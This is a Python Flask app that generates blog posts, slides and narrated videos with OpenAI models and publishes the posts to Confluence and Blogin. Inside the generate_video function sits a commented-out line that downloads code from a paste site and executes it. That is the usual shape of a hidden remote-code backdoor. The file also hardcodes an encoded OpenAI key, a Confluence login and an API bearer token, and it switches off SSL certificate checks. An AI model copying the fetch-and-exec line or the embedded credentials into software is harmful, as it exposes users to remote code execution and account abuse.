from flask import Flask,render_template,request,jsonify
import openai,requests,datetime
from requests import get
import urllib.request
from gtts import gTTS
from moviepy.editor import *
import collections
import collections.abc
import json,re,os
import base64
import pptx,re
from PIL import Image
import urllib.request
from pptx import Presentation
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

app=Flask(__name__)

def save_images(img_url):
    urllib.request.urlretrieve(img_url,f'{img_url}.png')
    img=Image.open(f"{img_url}.png")
    img.save(f"images/{img_url}.png")
    
openai.api_key=base64.b64decode("c2stRklBMXVOalc1cDUwZG9HT3BpZ2hUM0JsYmtGSmttNkFJRVBrVkF0RFdydHRUelY2").decode('ascii')




def correct_sent(sent):
    response = openai.Completion.create(
        model="text-davinci-003",
        prompt="Correct any spelling or grammatical mistake in the following sentence:\n\n{sent}.",
        temperature=1,
        max_tokens=230,
        top_p=1,
        frequency_penalty=0,
        presence_penalty=0
    )
    return response["choices"][0]["text"]

def create_summary_example(txt)->str:
    response = openai.Completion.create(
        model="text-davinci-003",
        prompt=f"As an experienced software engineer and data scientist, please give a use case and example where the {txt} is used.",
        temperature=1,
        max_tokens=12,   
        top_p=1,
        frequency_penalty=0.41,
        presence_penalty=0.51
    )
    return response["choices"][0]["text"]

def detect_emotion(topic)->str:
    response = openai.Completion.create(
        model="text-davinci-003",
        prompt=f"Detect the emotion of the phrase : \"{topic}\".",
        temperature=1,
        max_tokens=256,
        top_p=1,
        frequency_penalty=0,
        presence_penalty=0
    )
    return response["choices"][0]["text"]


def generate_blog_from_keywords(keywords,mlength,reaction="")->str: 
    example=create_summary_example("and ".join([x for x in keywords.split(",")])) 
    response = openai.Completion.create(
        model="text-davinci-003",
        prompt=f"Write a blog or content in at least {mlength} words which should contain detailed study on keywords: {keywords} . Make separate paragraphs for better understanding. For example , you can write details about {example} .  Keep in mind you have to focus on the points: {reaction} and improve the output. Start with some wishes or quotes.",
        temperature=1,
        max_tokens=3899,   
        top_p=1,
        frequency_penalty=0.41,
        presence_penalty=0.51
    )
    resp=response["choices"][0]["text"]
    print(resp)
    return resp
 
def create_summary(blog)->str:
    response = openai.Completion.create(
        model="text-davinci-003",
        prompt=f"As an experienced blogger, Give an idea on the topic {blog}",
        temperature=1.0,
        max_tokens=600,
        top_p=1.0,
        frequency_penalty=0.6,
        presence_penalty=0.6
    )
    print(response)
    return response["choices"][0]["text"]

def create_summary_prompt(topic)->str:
    response = openai.Completion.create(
        model="text-davinci-003",
        prompt=f"Please summarize accuractely the text :  {topic}",
        temperature=1.0,
        max_tokens=120,
        top_p=1.0,
        frequency_penalty=0.6,
        presence_penalty=0.6
    )
    print(response)
    return response["choices"][0]["text"]
    
def make_confluence_blog(topic,blog):
    data={
    "type": "page",
    "status": "current",
    "space": {
        "key": "~62f247b71323922c61e3a6ef",
        "name": topic,
        "description": {
            "plain": {
                "value": f"This is an {topic} space",
                "representation": "plain"
            }
        }
    },
    "title": topic,
    "body": {
        "storage": {
            "value": f"<p>{blog}</p>",
            "representation": "storage"
        }
    }
    }
    headers={
        "Authorization":"Basic cHJlZXRpc2hAemV0YS50ZWNoOkFUQVRUM3hGZkdGMGZSQ3gwMjdnU01tVHB5Sm9lQUhiVzdTX2VOcHItcWtlby1SdklvNDNFSV9ockVaa1ZNVkc2R1ZwUzFER3RxUXVjNFl4b3I1NVo4ZTZZaktZNUlSMHdFbDNPd0ozeDAxNHhTMm9FTkNER2ljdHZOa1YxQUdBVnhBdUNiZzdOdWg0dHQwUmpMX19oZEVQWXZNYktuM2gyLVM2MEFzcjN2WHo0N01LOEJxbDBHaz00NzQ2QzkzQw==",
        "Content-Type":"application/json"
    }
    url="https://zeta-tm.atlassian.net/wiki/rest/api/content" 
    resp=requests.post(url=url,data=json.dumps(data),headers=
                       headers)
    print(resp.content)
    return resp.content

def make_blogin_blog(topic,blog):
    url="https://blogin.co/api/rest/posts"
    data={
    "title": topic,
    "text": f"<div>{blog}</div>",
    "published": True,
    "date_published": "2020-03-02T09:47:51+01:00",
    "wiki": False,
    "important": False,
    "pinned": False,
    "author": {
        "id": 140285
    },
    "categories": [
        {
            "id": 125
        },
        {
            "name": "News"
        },
        {
            "name": "Reports/Meetings"
        }
    ],
    "teams": [
        {
            "id": -1
        }
    ],
    "tags": ["Tech blogs"],
    "approved": 1
    }
    headers={
        "Authorization": "Bearer dY0PWeXqXVei5zkhW2bqj8cTvlvQSVGJkt6k79ZXVciKnRVywIZIdfYxDCCbLYCzbojQvINeojoSSpRhwN9olqlkr",
        "Content-Type": "application/json"
        
    }
    resp=requests.post(url=url,data=json.dumps(data),headers=headers)
    print(resp.content)
    return resp.content

def create_blog(topic)->str:
    if("," in topic):
        return generate_blog_from_keywords(topic)
    response = openai.Completion.create(
        model="text-davinci-003",
        prompt=f"Write a company blog explaining the {topic}. Write as a tech blogger",
        temperature=1.0,
        max_tokens=4000,
        top_p=1.0,
        frequency_penalty=0.7,
        presence_penalty=0.7
    )
    return response["choices"][0]["text"]

def make_blogs_on_press(topic):
    resp=create_blog(topic)
    make_confluence_blog(topic,f"{resp}")
    make_blogin_blog(topic,resp)   

@app.route("/loading",methods=["GET"])
def loading():
    return render_template("loading.html")
import time 

@app.route("/blog/<topic>",methods=["GET"])
def blog(topic):
    t1=time.time()
    reaction=request.args.get("reaction")
    confl=request.args.get("confl")
    blogin=request.args.get("blogin")
    lenw=request.args.get("mlength")
    if len(topic)>120:
        topic=create_summary_prompt(topic)
    emotion=detect_emotion(topic)
    resp=generate_blog_from_keywords(topic,lenw,reaction)
    phrases=[phrase for phrase in resp.split("\n\n")]
    cnt_img=1
    list_img=[]
    summ=create_summary(resp)
    for x in phrases:
        cnt_img+=1
        if cnt_img==5:
            break
        img_url=generate_image(topic.strip())
        list_img.append(img_url)
    reslt=""
    i=0
    resp1=""
    cnt=0
    for x in phrases:
        resp1+=f"  |> Continuing with Point {str(cnt)}, {x}"
    liimg=[]
    for phrase in phrases:
        if i<len(list_img):
            reslt+=phrase+f"<br/><img src='{list_img[i]}' style='width:200px;height:200px;'/>"
            liimg.append(f"<br/><img src='{list_img[i]}' style='width:200px;height:200px;'/>")
        else:
            reslt+=phrase
        i+=1
    make_confluence_blog(topic,f"{resp}")
    make_blogin_blog(topic,reslt)
    resplist=resp.split("\n\n")
    t2=time.time()
    print(f"Total runtiume is : {(t2-t1)/1000}")
    return render_template('index.html',blog=resplist,ilist=liimg,lenb=len(resplist),leni=len(liimg),summary=summ,emotion=emotion)


@app.route("/blogsummary",methods=["GET"])
def blogsummary():
    topic=request.args.get("topic")
    print(topic)
    make_ppt("preeti",topic)
    inc_generate_video(create_blog(topic))
    return render_template('summary.html',blog=create_summary(topic))
    
def make_chat(username,topic):
    output = re.sub(r'^.*?{', '{', create_blog(topic))
    
    
    file=open(username+"ppt.json","w")

    # Save the JSON data string to a file
    with open(username+"ppt.json", "w") as json_file:
        json_file.write('{"data": "'+output+'"}')


    with open(username+"ppt.json", "r") as f:
        # Read the lines of the file into a list
        lines = f.readlines()

    delimiter = "{"
    for i in range(len(lines)):
        # Find the index of the delimiter in the current line
        index = lines[i].find(delimiter)
        # If found....
        if index != -1:
            # Remove characters before the delimiter and update the line
            lines[i] = lines[i][index:]
            break
        else:
            lines[i]=""
        

    # Write the updated lines to a new file
    with open(username+"ppt1.json", "w") as f:
        f.writelines(lines)

    return output

def ppt(username):
    prs = Presentation()

    # Read the JSON object from a file
    with open(username+"ppt.json", 'r') as f:
        ppt = json.load(f)

    # Extract the title and slides fields from the JSON object
    title = ppt['title']
    slides = ppt['slides']

    # Add a title slide
    title_slide_layout = prs.slide_layouts[0]
    slide1 = prs.slides.add_slide(title_slide_layout)
    title1 = slide1.shapes.title
    subtitle = slide1.placeholders[1]
    title1.text = title
    subtitle.text = "By ChatGPT"

    # Loop through each slide and extract the title and content fields
    for slide in slides:
        slide_title = slide['title']
        slide_content = slide['content']
        print(f"Slide title: {slide_title}")
        print("Slide content:")

        # Add a bullet slide
        bullet_slide_layout = prs.slide_layouts[3]
        slide2 = prs.slides.add_slide(bullet_slide_layout)
        title2 = slide2.shapes.title
        body2 = slide2.shapes.placeholders[1]
        title2.text = slide_title
        tf = body2.text_frame

        for content_string in slide_content:
            p = tf.add_paragraph()
            p.text = content_string
            p.level = 1
        print("\n\n")
    prs.save("ppt-api/"+username+str('.pptx'))

def create_summary_for_ppt_text(txt):
    response = openai.Completion.create(
        model="text-davinci-003",
        prompt=f"As a computer engineer or data scientist, give a very brief summary on {txt}",
        temperature=1.0,
        max_tokens=40,
        top_p=1.0,
        frequency_penalty=0.6,
        presence_penalty=0.6
    )
    print(response)
    return response["choices"][0]["text"]  

def generate_ppt(story,topic):
    lines=story.split("\n")
    prs = Presentation()
    content,slide_title="",""
    for line in lines :
       # print(line)
        if(line.count("Slide")==1):
            print("got line")
            print(slide_title)
            print(":")
            print(content)
            split_content=content.split(".")
            plain_text=content
                
            if(slide_title!="" and content!=""):
                bullet_slide_layout = prs.slide_layouts[8]
                slide2 = prs.slides.add_slide(bullet_slide_layout)
                title2 = slide2.shapes.title
                body2 = slide2.shapes.placeholders[1]
                title2.text = slide_title
                tf = body2.text_frame
                p=tf.add_paragraph()
                p.text=plain_text                
            content=""
            slide_title=line
        else:
            content+=line+"\n"
            
    prs.save(f"pptgpt.pptx")    

def inc_generate_video(blog):
    lines=blog.split("\n")
    i=0
    for line in lines:
        generate_video(line,i)
        i+=1
    clips = []
    l_files = os.listdir("videos")
    for file in l_files:
        clip = VideoFileClip(f"videos/{file}")
        clips.append(clip)
    print(len(clips))
    print("Concatenate All The Clips to Create a Final Video...")
    final_video = concatenate_videoclips(clips, method="compose")
    final_video = final_video.write_videofile("final_video.mp4", fps=24,codec='mpeg4',audio_codec='mp3')
    print("The Final Video Has Been Created Successfully!")


def generate_image(topic):
    response = openai.Image.create(
        prompt=f"Generate proper image on {topic.strip()}",
        n=1,
        size="1024x1024"
    )
    return response['data'][0]['url']



def generate_video(topic,i):
    topic=topic.strip()
    
    if(topic==""):
        return
    topic=topic[:min(len(topic),len("".join(topic.split(" ")[:100])))]
    response = openai.Image.create(
        prompt=topic.strip(),
        n=1,
        size="1024x1024"
    )
    
    print("Generate New AI Image From Paragraph...")
  #  x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
    image_url = response['data'][0]['url']
    print(image_url)
  #  urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
    print("The Generated Image Saved in Images Folder!")

    # Create gTTS instance and save to a file
    tts = gTTS(text=topic , lang='en', slow=False)
    tts.save(f"audio/voiceover{i}.mp3")
    print("The Paragraph Converted into VoiceOver & Saved in Audio Folder!")

    # Load the audio file using moviepy
    print("Extract voiceover and get duration...")
    audio_clip = AudioFileClip(f"audio/voiceover{i}.mp3")
    audio_duration = audio_clip.duration

    # Load the image file using moviepy
    print("Extract Image Clip and Set Duration...")
    image_clip=None
    if(image_url!=""):
        image_clip = ImageClip(image_url).set_duration(audio_duration)

    # Use moviepy to create a text clip from the text
    # text_clip=None
    # if(topic.isalpha()==True):
    #     print("Customize The Text Clip...")
    #     text_clip = TextClip(topic, fontsize=50, color="white")
    #     text_clip = text_clip.set_pos('center').set_duration(audio_duration)

    # Use moviepy to create a final video by concatenating
    # the audio, image, and text clips
    print("Concatenate Audio, Image, Text to Create Final Clip...")
    if(image_clip!=None):
        clip = image_clip.set_audio(audio_clip)
        video = CompositeVideoClip([clip])
        print("")
        video = video.write_videofile(f"videos/video{i}.mp4", fps=24,codec='mpeg4',audio_codec='mp3')
        print(f"The Video{i} Has Been Created Successfully!")
      
           
    
def make_ppt(user,topic):
    response = openai.Completion.create(
        model="text-davinci-003",
        prompt=f"Make a presentation with slide title and  with name {user} that describes the development of {topic}. Make it look visually appealing",
        temperature=1.0,
        max_tokens=4050,
        top_p=1.0,
        frequency_penalty=0.7,
        presence_penalty=0.7
    )
    print("PPT tarted")
    generate_ppt(response["choices"][0]["text"],topic)
    print("PPT generated")
    return response["choices"][0]["text"]
   

if __name__=="__main__":
    
    app.run(host='0.0.0.0',port=8081,debug=False)